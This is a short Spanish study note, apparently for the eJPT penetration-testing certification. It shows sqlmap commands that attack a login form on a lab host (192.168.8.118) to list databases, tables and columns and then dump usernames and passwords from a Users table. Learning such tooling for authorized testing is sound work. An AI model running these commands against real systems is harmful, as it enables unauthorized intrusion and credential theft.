- **Usar *SQLMAP* al ver paneles de login o algo similar.**

1. Ver las **Bases de Datos**:
```
sqlmap -u 192.168.8.118/administrator/ --forms --dbs --batch
```
![Uso de SQLMAP 1](ejpt/img/uso-de-sqlmap-1.png)
![Uso de SQLMAP 2](ejpt/img/uso-de-sqlmap-2.png)

2. Ver las **Tablas** de una **Base de Datos**:
```
sqlmap -u 192.168.8.118/administrator --forms -D Webapp --tables --batch
```
![Uso de SQLMAP 3](ejpt/img/uso-de-sqlmap-3.png)
![Uso de SQLMAP 4](ejpt/img/uso-de-sqlmap-4.png)

3. Ver las **Columnas** de una **Tabla** de una **Base de Datos**:
```
sqlmap -u 192.168.8.118/administrator --forms -D Webapp -T Users --columns --batch
```
![Uso de SQLMAP 5](ejpt/img/uso-de-sqlmap-5.png)
![Uso de SQLMAP 6](ejpt/img/uso-de-sqlmap-6.png)

4. Ver el contenido de las **Columnas**:
```
sqlmap -u 192.168.8.118/administrator --forms -D Webapp -T Users -C id,password, username --dump --batch
```
![Uso de SQLMAP 7](ejpt/img/uso-de-sqlmap-7.png)
![Uso de SQLMAP 8](ejpt/img/uso-de-sqlmap-8.png)
- - ***--forms* sirve para que *SQLMAP* ataque a los formularios (paneles de login) *HTML* que encuentre.**
- ***--batch* sirve para que *SQLMAP* se ejecute de una manera mas automatizada, esto responde preguntas automáticamente dependiendo como vaya el ataque.**
- ***--dump* sirve para volcar los datos, si no los volcamos no los podremos ver.**